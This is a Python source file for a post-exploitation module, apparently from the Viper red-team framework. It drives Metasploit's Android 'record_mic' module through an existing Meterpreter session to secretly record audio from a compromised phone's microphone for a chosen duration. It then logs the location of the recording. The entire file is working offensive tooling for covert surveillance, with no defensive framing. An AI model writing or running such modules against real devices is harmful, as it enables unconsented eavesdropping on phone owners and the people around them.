# -*- coding: utf-8 -*-
# @File  : SimplePostPythonModule.py
# @Date  : 2019/1/12
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "手机录制音频"
    DESC_ZH = "手机录制音频(Android)\n"

    NAME_EN = "Phone recording audio"
    DESC_EN = "Phone recording audio.\n"
    MODULETYPE = TAG2TYPE.Discovery
    PLATFORM = ["Android"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = []
    REFERENCES = []
    AUTHOR = ["Viper"]
    REQUIRE_SESSION = True

    OPTIONS = register_options([
        OptionInt(name='DURATION',
                  tag_zh="录音时间(秒)", desc_zh="录音时间(秒)",
                  tag_en="Recording time(Second)", desc_en="Recording time(Second)",
                  required=True, default=5),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "android/gather/record_mic"

    def check(self):
        """执行前的检查函数"""
        self.session = Session(self._sessionid)
        if self.session.platform.lower().startswith('android') is not True:
            return False, "模块只支持Android平台的Meterpreter", "Module only supports Meterpreter for Android"
        self.set_msf_option('DURATION', self.param("DURATION"))
        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
            return
        try:
            self.log_good(f"录音文件: {data}", f"Recording file: {data}")

        except Exception as E:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_except(str(E), str(E))
